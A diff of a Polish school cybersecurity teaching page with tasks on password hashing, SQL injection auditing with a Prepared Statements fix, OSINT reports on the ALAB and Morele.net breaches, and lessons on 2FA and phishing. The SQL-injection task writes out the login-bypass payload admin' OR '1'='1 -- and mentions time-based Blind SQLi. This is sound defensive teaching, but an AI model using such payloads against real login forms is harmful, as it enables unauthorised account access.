+def stworz_bezpieczny_hash(haslo, sol):
+    # Twoja implementacja...
+```
+
+3. ANALIZA MERYTORYCZNA:
+- Dlaczego hasha SHA-256 nie da się "odszyfrować" w drugą stronę?:
+  [Odpowiedź: Jest to operacja stratna matematycznie, funkcja kompresująca 512 bitów w 256...]
+- Co daje zastosowanie losowej soli (Salt) dla każdego konta?:
+  [Odpowiedź: Neutralizuje gotowe bazy Rainbow Tables...]
+
+4. WYZWANIE NA OCENĘ 6 (OPCJONALNIE):
+- [Opis mini-ataku słownikowego lub zliczania zmienionych bitów w Colab]: ...
+----------------------------------------------------------------</div>
+      </div>
+
+      <!-- TASK 4: TECHNIKUM - WEB AUDIT & OSINT ALAB/MORELE -->
+      <div class="rounded-xl border border-cyber-border bg-cyber-card p-6 space-y-6 cyber-border-glow">
+        <div class="flex flex-col sm:flex-row sm:items-start justify-between gap-4 border-b border-cyber-border/60 pb-4">
+          <div class="space-y-1">
+            <div class="flex flex-wrap items-center gap-2">
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-purple/15 text-cyber-purple border border-cyber-purple/30 font-bold uppercase">Technikum • Klasa 2</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">Czas: 90 min (Projekt)</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-red-500/10 text-red-400 border border-red-500/30">OWASP Top 10 & OSINT</span>
+            </div>
+            <h3 class="text-lg font-bold font-mono text-white mt-1">
+              Misja TECH-02: Operacja „Web Auditor” – Audyt Podatności SQL Injection & Raport OSINT z Afery Medycznej ALAB
+            </h3>
+            <p class="text-xs text-slate-400">
+              Analizujesz podatny kod formularza logowania, przygotowujesz łatkę z Prepared Statements oraz sporządzasz profesjonalny raport OSINT z głośnego wycieku w Polsce.
+            </p>
+          </div>
+
+          <div class="flex flex-wrap gap-2 shrink-0">
+            <button onclick="copyTeacherTask('task-tech-2-teacher')" class="px-3 py-1.5 rounded-lg bg-cyber-purple/15 hover:bg-cyber-purple/25 text-cyber-purple border border-cyber-purple/40 text-xs font-mono font-bold transition flex items-center gap-1.5">
+              <span>📋 Treść dla Nauczyciela</span>
+            </button>
+            <button onclick="copyStudentTemplate('task-tech-2-student')" class="px-3 py-1.5 rounded-lg bg-cyber-neon/15 hover:bg-cyber-neon/25 text-cyber-neon border border-cyber-neon/40 text-xs font-mono font-bold transition flex items-center gap-1.5">
+              <span>✍️ Formularz dla Ucznia</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 text-xs font-mono">
+          <div class="space-y-3 lg:col-span-2">
+            <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-3">
+              <div class="text-cyber-purple font-bold flex items-center gap-2">
+                <span>🎯 CEL OPERACYJNY:</span>
+              </div>
+              <ul class="text-slate-300 font-sans list-disc list-inside space-y-1 text-xs">
+                <li>Potrafisz zidentyfikować podatność SQL Injection w kodzie backendowym (PHP / Node / Python).</li>
+                <li>Wiesz jak zneutralizować atak za pomocą sparametryzowanych zapytań (Prepared Statements).</li>
+                <li>Potrafisz zebrać jawne informacje wywiadowcze (OSINT) o skutkach realnego wycieku danych w polskiej instytucji.</li>
+              </ul>
+
+              <div class="text-cyber-warning font-bold pt-2 flex items-center gap-2">
+                <span>🛠️ INSTRUKCJA WYKONAWCZA:</span>
+              </div>
+              <ol class="text-slate-300 font-sans list-decimal list-inside space-y-2 text-xs">
+                <li><strong>Krok 1 (Analiza podatności):</strong> Przeanalizuj zapytanie: <code class="text-slate-300">SELECT * FROM users WHERE login = '$user' AND pass = '$pass';</code>. Wyjaśnij, dlaczego wpisanie <code class="text-cyber-neon">admin' OR '1'='1</code> omija proces weryfikacji hasła.</li>
+                <li><strong>Krok 2 (Refaktoryzacja kodu):</strong> Napisz bezpieczną wersję tego zapytania w języku PHP (z użyciem PDO) lub Pythonie (z użyciem biblioteki sqlite3/psycopg2) ze znakami zastępczymi <code class="text-cyber-neon">?</code> lub <code class="text-cyber-neon">:login</code>.</li>
+                <li><strong>Krok 3 (Raport OSINT ALAB / Morele):</strong> Znajdź w publicznych źródłach branżowych (np. Niebezpiecznik, Zaufana Trzecia Strona, CERT Polska) opis afery wyciekowej ALAB laboratoria z 2023 r. lub Morele.net z 2018 r. Wypisz: wektor ataku, jakie dane wyciekły i jakie konsekwencje poniósł podmiot.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-3 flex flex-col justify-between">
+            <div>
+              <div class="text-cyber-purple font-bold flex items-center gap-2 mb-2">
+                <span>📊 KRYTERIA OCENY:</span>
+              </div>
+              <div class="space-y-2 text-[11px]">
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-amber-400 block">Dostateczny (3):</strong>
+                  <span class="text-slate-300">Wyjaśnienie logiki ładunku ' OR '1'='1 bez kodu naprawczego.</span>
+                </div>
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-cyber-cyan block">Dobry (4):</strong>
+                  <span class="text-slate-300">Ocena 3 + poprawny kod z Prepared Statements w wybranym języku.</span>
+                </div>
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-cyber-neon block">Bardzo Dobry (5):</strong>
+                  <span class="text-slate-300">Ocena 4 + rzetelny raport OSINT ze studium przypadku ALAB lub Morele (min. 100 słów).</span>
+                </div>
+                <div class="p-2 rounded bg-purple-950/40 border border-purple-500/40">
+                  <strong class="text-purple-300 block">Celujący (6) - Wyzwanie:</strong>
+                  <span class="text-slate-300">Wskazanie różnicy między atakiem In-band SQLi a Blind SQLi (opartym na czasie - SLEEP) lub przygotowanie działającego skryptu testowego w SQLite!</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div id="task-tech-2-teacher" class="hidden"># ZADANIE DLA TECHNIKUM: Audyt Bezpieczeństwa Webowego (SQL Injection) & Raport OSINT
+Profil: Technikum Informatyczne / Programistyczne
+Platforma: Google Classroom
+
+CELE ZADANIA:
+1. Zrozumienie mechanizmu wstrzykiwania kodu SQL do aplikacji internetowych.
+2. Zastosowanie techniki Prepared Statements (sparametryzowane zapytania) jako remedium na błędy OWASP Top 10.
+3. Praktyczna umiejętność białego wywiadu (OSINT) w oparciu o publicznie znane incydenty bezpieczeństwa w Polsce.
+
+TREŚĆ ZADANIA:
+1. Wyjaśnij mechanizm działania ataku SQL Injection na bazie podatnego zapytania: SELECT * FROM users WHERE user = '$user' AND pass = '$pass'.
+2. Przepisz zapytanie na wersję bezpieczną (Prepared Statements).
+3. Sporządź notatkę OSINT z analizy afery wyciekowej ALAB Laboratoria (2023) lub Morele.net (2018).
+4. [Dla chętnych na ocenę 6]: Wyjaśnij pojęcie Blind SQL Injection (atak ślepy oparty o błędy lub opóźnienia czasowe benchmark/sleep).</div>
+
+        <div id="task-tech-2-student" class="hidden">--- FORMULARZ ODPOWIEDZI UCZNIA (Wklej do Google Classroom) ---
+Imię i Nazwisko: [WPISZ TUTAJ]
+Klasa: [WPISZ KLASĘ, NP. 2TI TECHNIKUM]
+Data: [RRRR-MM-DD]
+
+1. ANALIZA PODATNOŚCI SQL INJECTION:
+- Dlaczego wpisanie: admin' OR '1'='1 -- w formularzu logowania omija sprawdzanie hasła?:
+  [Odpowiedź: Znak apostrofu zamyka string użytkownika, a OR 1=1 tworzy warunek zawsze prawdziwy, natomiast -- komentuje resztę zapytania...]
+
+2. KOD NAPRAWCZY (PREPARED STATEMENTS):
+[Wklej kod w wybranym języku, np. PHP PDO / Python sqlite3]:
+```python
+# Przykład w Pythonie:
+cursor.execute("SELECT * FROM users WHERE user = ? AND pass = ?", (input_user, input_pass))
+```
+
+3. RAPORT OSINT (STUDIUM PRZYPADKU ALAB LABORATORIA LUB MORELE):
+- Podmiot dotknięty incydentem: [ALAB Laboratoria / Morele.net]
+- Rok incydentu: [2023 / 2018]
+- Wektor ataku / Przyczyna: [NP. Ransomware, brak segmentacji sieci, nieautoryzowany dostęp do bazy...]
+- Kategorie skradzionych danych: [PESEL, wyniki badań krwi, adresy, telefony...]
+- Skutki dla użytkowników i kary (UODO): [Nałożona kara, ryzyko kradzieży tożsamości...]
+
+4. WYZWANIE NA OCENĘ 6 (OPCJONALNIE):
+- [Czym jest Blind SQL Injection i jak działa funkcja SLEEP(5)]: ...
+----------------------------------------------------------------</div>
+      </div>
+
+      <!-- INTERACTIVE SELF-STUDY WORKSHEETS (KARTY SAMODZIELNEJ PRACY) -->
+      <div class="rounded-2xl border border-cyber-border bg-gradient-to-b from-[#0c121e] to-cyber-card p-6 space-y-6 cyber-border-glow">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-cyber-border/60 pb-4">
+          <div>
+            <div class="flex items-center gap-2">
+              <span class="w-2.5 h-2.5 rounded-full bg-cyber-neon animate-pulse"></span>
+              <h3 class="text-lg font-bold font-mono text-white">Interaktywne Karty Samodzielnej Pracy Ucznia</h3>
+            </div>
+            <p class="text-xs text-slate-400 mt-1">Zaznaczaj zrealizowane kroki ćwiczeń – stan Twoich postępów zapisuje się automatycznie w przeglądarce!</p>
+          </div>
+          <div class="text-xs font-mono px-3 py-1.5 rounded-lg bg-cyber-dark border border-slate-700 text-slate-300">
+            Postęp kart: <span id="self-study-progress" class="text-cyber-neon font-bold">0 / 8</span>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
           
-          <div class="border-l-2 border-cyber-purple pl-3 space-y-1">
-            <p class="font-bold text-white">MISJA 1: Analiza Wycieków (OSINT)</p>
-            <p>Skorzystaj ze stron OSINTowych, np. HaveIBeenPwned lub DeHashed. Znajdź informacje o głośnym wycieku danych z ostatnich lat (np. Morele, ALAB, RockYou).</p>
-          </div>
-
-          <div class="border-l-2 border-cyber-purple pl-3 space-y-1">
-            <p class="font-bold text-white">MISJA 2: Python Hash Generator z Pętlą (Google Colab)</p>
-            <p>Napisz skrypt w Google Colab z użyciem modułu hashlib, który przyjmie listę haseł (np. ["admin", "123456", "qwerty"]) i w pętli for wygeneruje hexdigest SHA-256 dla każdego z nich.</p>
-          </div>
-
-          <div class="border-t border-slate-700 pt-2 font-semibold text-cyber-purple">
-            <p>CO MUSISZ ODDAĆ W GOOGLE CLASSROOM:</p>
-            <p>1. Raport OSINT (w 2-3 zdaniach): Jaki znany wyciek przeanalizowałeś i jakie dane (oprócz haseł) dostały się wtedy w ręce hakerów?</p>
-            <p>2. Link do Notatnika: Wklej bezpośredni link (z uprawnieniami do odczytu) do Twojego notatnika Colab z poprawnie działającą pętlą.</p>
-          </div>
-        </div>
-      </div>
-
-      <!-- Task 3: Web Security Audit -->
-      <div class="rounded-xl border border-cyber-border bg-cyber-card p-6 space-y-4 cyber-border-glow">
-        <div class="flex items-start justify-between">
-          <div>
-            <div class="flex items-center gap-2">
-              <span class="text-xs font-mono px-2 py-0.5 rounded bg-cyber-neon/15 text-cyber-neon border border-cyber-neon/30 font-bold uppercase">Klasa 2 • WebDev & Bezpieczeństwo</span>
-              <span class="text-xs font-mono text-slate-400">Czas: 45 min</span>
+          <!-- Sheet 1: Osobista Cyber-Twierdza -->
+          <div class="p-5 rounded-xl bg-cyber-dark border border-slate-800 space-y-3">
+            <div class="flex items-center justify-between">
+              <strong class="text-xs font-mono text-cyber-cyan uppercase font-bold">Karta A: Moja Osobista Cyber-Twierdza</strong>
+              <span class="text-lg">🛡️</span>
             </div>
-            <h3 class="text-lg font-bold font-mono text-white mt-2">Audyt Formularza Webowego: SQL Injection & XSS</h3>
-            <p class="text-xs text-slate-400">Weryfikacja podatności aplikacji webowej oraz przygotowanie bezpiecznego zapytania</p>
+            <div class="space-y-2 text-xs font-mono text-slate-300">
+              <label class="flex items-start gap-2.5 cursor-pointer p-2 rounded hover:bg-slate-800/60 transition">
+                <input type="checkbox" id="check-step-1" onchange="toggleSelfCheck('step-1')" class="rounded bg-cyber-black border-slate-700 text-cyber-neon focus:ring-0 mt-0.5">
+                <span>1. Sprawdziłem swój główny adres e-mail na HaveIBeenPwned.</span>
+              </label>
+              <label class="flex items-start gap-2.5 cursor-pointer p-2 rounded hover:bg-slate-800/60 transition">
+                <input type="checkbox" id="check-step-2" onchange="toggleSelfCheck('step-2')" class="rounded bg-cyber-black border-slate-700 text-cyber-neon focus:ring-0 mt-0.5">
+                <span>2. Zmieniłem hasło na koncie pocztowym na unikalne (min. 16 znaków).</span>
+              </label>
+              <label class="flex items-start gap-2.5 cursor-pointer p-2 rounded hover:bg-slate-800/60 transition">
+                <input type="checkbox" id="check-step-3" onchange="toggleSelfCheck('step-3')" class="rounded bg-cyber-black border-slate-700 text-cyber-neon focus:ring-0 mt-0.5">
+                <span>3. Włączyłem weryfikację dwuetapową 2FA w aplikacji (Google / Bitwarden).</span>
+              </label>
+              <label class="flex items-start gap-2.5 cursor-pointer p-2 rounded hover:bg-slate-800/60 transition">
+                <input type="checkbox" id="check-step-4" onchange="toggleSelfCheck('step-4')" class="rounded bg-cyber-black border-slate-700 text-cyber-neon focus:ring-0 mt-0.5">
+                <span>4. Zapisałem kody odzyskiwania konta (Backup Codes) w bezpiecznym miejscu offline.</span>
+              </label>
+            </div>
           </div>
-          <button onclick="copyClassroomTask('task-web-content')" class="px-4 py-2 rounded-lg bg-cyber-neon/15 hover:bg-cyber-neon/30 text-cyber-neon border border-cyber-neon/40 text-xs font-mono font-bold transition flex items-center gap-2">
-            <span>📋 Kopiuj Zadanie</span>
-          </button>
-        </div>
 
-        <div id="task-web-content" class="p-4 bg-cyber-dark rounded-xl border border-slate-800 text-xs font-mono text-slate-300 space-y-3 leading-relaxed">
-          <p class="text-cyber-neon font-bold"># AUDYT BEZPIECZEŃSTWA WEBOWEGO (Google Classroom)</p>
-          <p>Przeanalizuj poniższy fragment kodu w PHP/Node.js, który przyjmuje dane z formularza:</p>
-          <pre class="bg-black/60 p-2 rounded text-slate-200">query = "SELECT * FROM users WHERE user = '" + input_user + "' AND pass = '" + input_pass + "'";</pre>
-          <p>1. Wyjaśnij, dlaczego ten kod jest podatny na atak SQL Injection.</p>
-          <p>2. Jaki ładunek (payload) wpisany w pole użytkownika pozwoli zalogować się na konto administratora bez znajomości hasła?</p>
-          <p>3. Napisz poprawną wersję zapytania z użyciem techniki Prepared Statements (sparametryzowane zapytanie).</p>
+          <!-- Sheet 2: Audytor Kodu & OSINT -->
+          <div class="p-5 rounded-xl bg-cyber-dark border border-slate-800 space-y-3">
+            <div class="flex items-center justify-between">
+              <strong class="text-xs font-mono text-cyber-purple uppercase font-bold">Karta B: Laboratorium Audytora & Kod</strong>
+              <span class="text-lg">⚡</span>
+            </div>
+            <div class="space-y-2 text-xs font-mono text-slate-300">
+              <label class="flex items-start gap-2.5 cursor-pointer p-2 rounded hover:bg-slate-800/60 transition">
+                <input type="checkbox" id="check-step-5" onchange="toggleSelfCheck('step-5')" class="rounded bg-cyber-black border-slate-700 text-cyber-purple focus:ring-0 mt-0.5">
+                <span>5. Uruchomiłem skrypt SHA-256 w Google Colab i przetestowałem zmianę 1 litery.</span>
+              </label>
+              <label class="flex items-start gap-2.5 cursor-pointer p-2 rounded hover:bg-slate-800/60 transition">
+                <input type="checkbox" id="check-step-6" onchange="toggleSelfCheck('step-6')" class="rounded bg-cyber-black border-slate-700 text-cyber-purple focus:ring-0 mt-0.5">
+                <span>6. Zrozumiałem dlaczego konkatenacja stringów w SQL tworzy lukę SQLi.</span>
+              </label>
+              <label class="flex items-start gap-2.5 cursor-pointer p-2 rounded hover:bg-slate-800/60 transition">
+                <input type="checkbox" id="check-step-7" onchange="toggleSelfCheck('step-7')" class="rounded bg-cyber-black border-slate-700 text-cyber-purple focus:ring-0 mt-0.5">
+                <span>7. Zapisałem w telefonie bezpłatny numer CERT Polska (8080) do zgłaszania SMS.</span>
+              </label>
+              <label class="flex items-start gap-2.5 cursor-pointer p-2 rounded hover:bg-slate-800/60 transition">
+                <input type="checkbox" id="check-step-8" onchange="toggleSelfCheck('step-8')" class="rounded bg-cyber-black border-slate-700 text-cyber-purple focus:ring-0 mt-0.5">
+                <span>8. Rozwiązałem quiz wiedzy i uzyskałem wynik minimum 80%.</span>
+              </label>
+            </div>
+          </div>
         </div>
       </div>
     </section>
@@ -1674,99 +2139,250 @@ print(f"Hash: {hash_val}")</code></pre>
       }
     }
 
-    /* ================= SYLLABUS DATA ================= */
+    /* ================= SYLLABUS DATA (POGŁĘBIONA WIEDZA MERYTORYCZNA) ================= */
     const syllabusData = {
       lo: {
         toc: [
-          { id: 'lo-m1', title: 'Moduł 1: Tajemnice Haseł i Menedżery' },
-          { id: 'lo-m2', title: 'Moduł 2: Trzy Złote Zasady Bezpieczeństwa' },
-          { id: 'lo-m3', title: 'Moduł 3: Phishing – Nie Daj Się Złowić' },
-          { id: 'lo-m4', title: 'Moduł 4: Prawo w IT & Licencje Open Source' }
+          { id: 'lo-m1', title: 'Moduł 1: Anatomia Haseł, Bazy Danych i Credential Stuffing' },
+          { id: 'lo-m2', title: 'Moduł 2: Trzy Złote Zasady Higieny & Architektura 2FA' },
+          { id: 'lo-m3', title: 'Moduł 3: Phishing, Socjotechnika & Analiza Czerwonych Flag' },
+          { id: 'lo-m4', title: 'Moduł 4: Prawo w IT, Licencje Open Source i Etyka AI' }
         ],
         modules: [
           {
             id: 'lo-m1',
-            tag: 'LEKCJA 2',
-            title: 'Tajemnice Haseł i Menedżery: Dlaczego "123456" to najgorszy pomysł?',
+            tag: 'LEKCJA 2 • PODSTAWY',
+            title: 'Anatomia Haseł, Bazy Danych i Zjawisko Credential Stuffing',
             content: `
-              <p class="text-sm text-slate-300 leading-relaxed">
-                Zapewne masz konto na kilkunastu portalach: szkoła, e-mail, social media, gry, sklepy. Większość ludzi używa jednego, w miarę skomplikowanego hasła do wszystkich tych miejsc. <strong>To gigantyczny błąd!</strong>
-              </p>
-              <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark my-4 space-y-2">
-                <span class="text-xs font-mono text-cyber-warning font-bold">JAK MYŚLI HAKER?</span>
-                <p class="text-xs text-slate-300 leading-relaxed font-sans">
-                  Hakerzy rzadko włamują się bezpośrednio na Twoje konto na Instagramie czy Gmailu. Zamiast tego, włamują się do słabiej zabezpieczonych sklepów internetowych lub starych forów, kradną całą bazę użytkowników, a następnie próbują tych samych e-maili i haseł na Facebooku czy koncie bankowym. Zjawisko to nazywamy <strong>Credential Stuffing</strong> w oparciu o <strong>Wyciek Danych (Data Breach)</strong>.
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  Większość użytkowników Internetu posiada konta w kilkudziesięciu serwisach: szkoła, e-dziennik, poczta elektroniczna, media społecznościowe, platformy gamingowe (Steam, Discord, Riot) oraz sklepy online. Z badań wynika, że aż <strong>65% internautów używa dokładnie tego samego hasła lub jego drobnych wariacji (np. Piesek123, Piesek123!) w wielu miejscach</strong>. To fundamentalny błąd w bezpieczeństwie cyfrowym.
                 </p>
+
+                <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-2 font-mono">
+                  <div class="text-cyber-warning font-bold flex items-center gap-2">
+                    <span>🔍 JAK WYGLĄDA PRAWDZIWA BAZA DANYCH SERWERA?</span>
+                  </div>
+                  <p class="text-[11px] text-slate-300 leading-normal font-sans">
+                    Gdy rejestrujesz się na stronie internetowej, Twoje dane trafiają do tabeli w relacyjnej bazie danych (np. PostgreSQL lub MySQL). Dobrze zabezpieczony serwis <strong>nigdy nie przechowuje hasła jawnym tekstem</strong>, lecz jako jednokierunkowy skrót matematyczny (hash) z unikalną solą:
+                  </p>
+                  <div class="bg-black/60 p-2.5 rounded border border-slate-800 text-[10px] text-cyber-neon overflow-x-auto">
+                    | user_id | email                 | password_hash (SHA-256 / bcrypt)                | salt         |<br>
+                    | 1042    | jan.kowalski@wp.pl    | $2a$12$e8nZ9hW1qK.2J9uY3kL4... (odcisk palca)   | a9f31d04b... |
+                  </div>
+                </div>
+
+                <h4 class="font-mono font-bold text-white text-sm pt-2 flex items-center gap-2">
+                  <span class="text-cyber-cyan">⚡</span> Co to jest wyciek danych (Data Breach) i Credential Stuffing?
+                </h4>
+                <p>
+                  Cyberprzestępcy rzadko tracą czas na bezpośrednie „łamanie” kont na silnie strzeżonych portalach Google czy Apple. Zamiast tego atakują <strong>słabo zabezpieczone małe sklepy internetowe, fora dyskusyjne lub stare gry online</strong>. Kradną stamtąd całą bazę użytkowników (miliony par login/hasło), a następnie uruchamiają zautomatyzowane boty (narzędzia testujące tysiące kont na minutę), sprawdzając te same dane na Facebooku, Gmailu, Netfliksie czy w bankowości elektronicznej.
+                </p>
+
+                <div class="p-3 bg-red-950/30 border border-red-500/40 rounded-lg text-slate-300">
+                  <strong class="text-red-400 block mb-1 font-mono">Realny przypadek: Wyciek Morele.net (2,2 mln kont)</strong>
+                  W 2018 r. doszło do jednego z największych wycieków w Polsce. Hakerzy przejęli bazę ponad 2 milionów klientów. Wykradziono nie tylko hashe haseł, ale także numery telefonów i numery PESEL, co pozwoliło oszustom na masowe ataki phishingowe SMS podszywające się pod sklep z żądaniem drobnej dopłaty.
+                </div>
+
+                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 font-mono text-[11px]">
+                  <strong class="text-cyber-neon block mb-1">💡 Zadanie do samodzielnej refleksji:</strong>
+                  Wypisz na kartce 5 portali, z których korzystasz najczęściej. Czy hasło do Twojego e-maila różni się od hasła do gier lub forów? Jeśli nie – Twoje konto e-mail (będące kluczem do odzyskiwania wszystkich innych haseł!) jest zagrożone.
+                </div>
               </div>
             `
           },
           {
             id: 'lo-m2',
-            tag: 'LEKCJA 2',
-            title: 'Trzy Złote Zasady Jak Żyć Bezpiecznie w Sieci',
+            tag: 'LEKCJA 2 • PROCEDURY',
+            title: 'Trzy Złote Zasady Higieny Cyfrowej & Architektura 2FA',
             content: `
-              <div class="space-y-4 my-3 text-xs font-mono">
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <span class="text-cyber-neon font-bold text-sm block mb-1">ZASADA 1: Jedno konto = Jedno unikalne hasło</span>
-                  <p class="text-slate-300 font-sans leading-relaxed">Nigdy nie używaj tego samego hasła w dwóch różnych miejscach. Jeśli jedno wycieknie, reszta Twoich kont jest wciąż bezpieczna.</p>
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  Zapewnienie sobie bezpieczeństwa w sieci nie wymaga wiedzy programistycznej ani drogiego oprogramowania. Wystarczy wdrożenie trzech sprawdzonych, branżowych standardów:
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-3 font-mono text-xs">
+                  <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-2">
+                    <span class="text-cyber-neon font-bold text-sm block">1. Zasada 1:1</span>
+                    <strong class="text-white text-xs block font-sans">Jedno konto = Jedno unikalne hasło</strong>
+                    <p class="text-[11px] text-slate-400 font-sans leading-normal">
+                      Nawet jeśli baza jednego serwisu wycieknie do Darknetu, haker nie uzyska dostępu do żadnego innego Twojego konta.
+                    </p>
+                  </div>
+
+                  <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-2">
+                    <span class="text-cyber-cyan font-bold text-sm block">2. Menedżer Haseł</span>
+                    <strong class="text-white text-xs block font-sans">Bitwarden / Keychain (Zero-Knowledge)</strong>
+                    <p class="text-[11px] text-slate-400 font-sans leading-normal">
+                      Człowiek nie jest w stanie zapamiętać 30 unikalnych haseł. Menedżer generuje ciągi 20-znakowe i szyfruje je lokalnie algorytmem AES-256.
+                    </p>
+                  </div>
+
+                  <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-2">
+                    <span class="text-cyber-purple font-bold text-sm block">3. Weryfikacja 2FA</span>
+                    <strong class="text-white text-xs block font-sans">Coś co wiesz + Coś co masz</strong>
+                    <p class="text-[11px] text-slate-400 font-sans leading-normal">
+                      Nawet jeśli haker zna Twoje hasło, bez fizycznego dostępu do telefonu lub klucza sprzętowego nie przełamie logowania.
+                    </p>
+                  </div>
                 </div>
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <span class="text-cyber-cyan font-bold text-sm block mb-1">ZASADA 2: Używaj Menedżera Haseł (np. Bitwarden)</span>
-                  <p class="text-slate-300 font-sans leading-relaxed">„Jak mam zapamiętać 20 różnych, trudnych haseł?!” – nie musisz. Menedżer haseł wymyśla skomplikowane ciągi za Ciebie i sam je wpisuje. Ty pamiętasz tylko jedno Główne Hasło (Master Password).</p>
+
+                <h4 class="font-mono font-bold text-white text-sm pt-2 flex items-center gap-2">
+                  <span class="text-cyber-neon">🛡️</span> Hierarchia bezpieczeństwa metod 2FA (Od najsłabszej do pancernej):
+                </h4>
+
+                <div class="space-y-2 font-mono text-xs">
+                  <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 flex items-start gap-3">
+                    <span class="px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 text-[10px] font-bold shrink-0">POZIOM 1 (PODSTAWOWY)</span>
+                    <div>
+                      <strong class="text-white">Kody SMS 2FA:</strong>
+                      <p class="text-[11px] text-slate-400 font-sans mt-0.5">
+                        Lepsze niż brak 2FA, ale podatne na tzw. <em>SIM Swapping</em> (wyrobienie duplikatu karty SIM u operatora przez oszusta) oraz podsłuch protokołu SS7 sieci komórkowej.
+                      </p>
+                    </div>
+                  </div>
+
+                  <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 flex items-start gap-3">
+                    <span class="px-2 py-0.5 rounded bg-cyber-cyan/20 text-cyber-cyan text-[10px] font-bold shrink-0">POZIOM 2 (ZALECANY)</span>
+                    <div>
+                      <strong class="text-white">Aplikacje TOTP (Google Authenticator, Bitwarden, Ente Auth):</strong>
+                      <p class="text-[11px] text-slate-400 font-sans mt-0.5">
+                        Generują 6-cyfrowy kod rotujący co 30 sekund w oparciu o algorytm matematyczny i czas zegara. Kod nie jest przesyłany siecią GSM, więc nie da się go podsłuchać!
+                      </p>
+                    </div>
+                  </div>
+
+                  <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800 flex items-start gap-3">
+                    <span class="px-2 py-0.5 rounded bg-cyber-neon/20 text-cyber-neon text-[10px] font-bold shrink-0">POZIOM 3 (PANCERNY)</span>
+                    <div>
+                      <strong class="text-white">Klucze sprzętowe FIDO2 / WebAuthn (YubiKey):</strong>
+                      <p class="text-[11px] text-slate-400 font-sans mt-0.5">
+                        Fizyczny klucz USB/NFC. W 100% odporny na phishing! Przeglądarka internetowa sprzętowo weryfikuje adres domeny – klucz nigdy nie przekaże odpowiedzi na sfałszowanej stronie logowania.
+                      </p>
+                    </div>
+                  </div>
                 </div>
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <span class="text-cyber-purple font-bold text-sm block mb-1">ZASADA 3: Włącz 2FA (Weryfikację Dwuetapową)</span>
-                  <p class="text-slate-300 font-sans leading-relaxed">Nawet jeśli haker pozna Twoje hasło, przy próbie logowania system poprosi o specjalny kod z Twojego telefonu (aplikacja Google Authenticator). Bez fizycznego dostępu do Twojego telefonu nikt nie zaloguje się na konto.</p>
+
+                <div class="p-3 bg-cyber-card rounded-lg border border-cyber-border font-mono text-[11px]">
+                  <strong class="text-cyber-cyan block mb-1">📌 Reguła Kopii Zapasowej 3-2-1:</strong>
+                  Dbaj o swoje projekty szkolne i zdjęcia! Trzymaj <strong>3</strong> kopie danych, na <strong>2</strong> różnych nośnikach (np. dysk komputera + pendrive), z czego przynajmniej <strong>1</strong> kopia trzymana jest w chmurze lub odłączona fizycznie od prądu (ochrona przed ransomware).
                 </div>
               </div>
             `
           },
           {
             id: 'lo-m3',
-            tag: 'LEKCJA 3',
-            title: 'Phishing: Jak rozpoznać oszusta i nie dać się złowić?',
+            tag: 'LEKCJA 3 • ANALIZA',
+            title: 'Phishing, Socjotechnika & Analiza Czerwonych Flag',
             content: `
-              <p class="text-sm text-slate-300 leading-relaxed">
-                <strong>Phishing</strong> (łowienie haseł) to metoda oszustwa polegająca na podszywaniu się pod zaufaną firmę (bank, kuriera InPost, szkołę), aby wyłudzić od Ciebie dane logowania lub numer karty płatniczej.
-              </p>
-              <div class="my-4 grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
-                <div class="p-3 bg-cyber-dark rounded-lg border border-slate-800">
-                  <span class="text-cyber-danger font-bold block mb-1">1. Presja Czasu</span>
-                  <p class="text-slate-400">„Paczka zostanie odesłana za 2 godziny!”. Oszust wywołuje panikę.</p>
+              <div class="space-y-4 text-xs font-sans text-slate-300 leading-relaxed">
+                <p>
+                  <strong>Phishing</strong> (od słowa <em>fishing</em> – łowienie) to forma ataku, w której przestępca nie łamie zabezpieczeń technicznych serwera, lecz <strong>atakuje najsłabsze ogniwo: psychikę człowieka</strong>. Podszywając się pod instytucję zaufania publicznego (bank, kurier InPost, policja, administracja szkolna, platforma gamingowa), nakłania ofiarę do podjęcia nierozważnego działania.
+                </p>
+
+                <div class="p-4 rounded-xl border border-cyber-border bg-cyber-dark space-y-3 font-mono">
+                  <div class="text-cyber-danger font-bold flex items-center gap-2">
+                    <span>🧠 CZTERY FILARY MANIPULACJI SOCJOTECHNICZNEJ:</span>
+                  </div>
+                  <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-[11px] font-sans">
+                    <div class="p-2.5 rounded bg-black/40 border border-slate-800">
+                      <strong class="text-red-400 font-mono block">1. Presja Czasu i Pośpiech</strong>
+                      „Twoja paczka zostanie zwrócona do nadawcy za 2 godziny!”. Oszust wie, że w pośpiechu mózg przełącza się na myślenie emocjonalne i wyłącza krytyczną ocenę.
